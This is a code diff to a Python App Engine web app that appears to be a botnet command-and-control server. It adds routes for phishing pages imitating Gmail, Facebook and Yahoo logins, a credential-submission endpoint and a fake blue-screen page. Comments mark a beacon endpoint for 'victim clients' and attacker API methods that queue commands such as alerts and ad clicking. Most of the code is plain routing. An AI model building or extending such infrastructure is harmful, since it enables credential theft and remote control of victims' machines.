@@ -32,6 +32,8 @@ from google.appengine.api import users
 from datetime import datetime
 from collections import OrderedDict
 
+from phishing import SubmitHandler, GmailHandler, FacebookHandler, YahooHandler
+
 class BaseHandler(webapp2.RequestHandler):
     def write(self, *a, **kw):
         self.response.out.write(*a,**kw)
@@ -76,6 +78,11 @@ class TestHandler(BaseHandler):
         template_values = {}
         self.render('test.html',template_values)
 
+
+class BsodHandler(BaseHandler):
+    def get(self):
+        template_values = {}
+        self.render('bsod.html',template_values)
 
 """
 TODO:
@@ -195,6 +202,13 @@ class Command():
 
 
 class JSONResponse():
+    """
+    JSONResponse just provides some helper methods to help make a response object in json
+    a little bit easier.
+
+    Whenever a node asks for a command, a JSON response must be created telling the node
+    what to do. So responses will use these methods to craft them.
+    """
     @staticmethod
     def assignment(cid):
         # return json indicating an assignment of cid to the client
@@ -414,8 +428,13 @@ class FlushHandler(BaseHandler):
 
 app = webapp2.WSGIApplication([
     ('/', MainHandler),
-    ('/test',TestHandler),
-    ('/beacon',BeaconHandler),
+    ('/test',TestHandler), 
+    ('/bsod',BsodHandler), # Phishing Pages
+    ('/submitauth',SubmitHandler), 
+    ('/gmail',GmailHandler), 
+    ('/facebook',FacebookHandler), 
+    ('/yahoo',YahooHandler), 
+    ('/beacon',BeaconHandler), # Endpoint for victim client beacons
     ('/getallnodes',GetAllNodesHandler), # Attacker Client API Methods
     ('/flushallnodes',FlushHandler), # Attacker Client API Methods
     ('/addcommand',AddCommandHandler), 
@@ -440,7 +459,7 @@ debug=True)
 # alert2 = {
 #             "type": "command".
 #             "commandID": command.id,
-#             "command": ["Alert2", "hey bitch what the fuck up"]
+#             "command": ["Alert2", ["hey bitch what the fuck up", "this is the body of the alert2"]]
 #         }
 
 # AdClicker = {
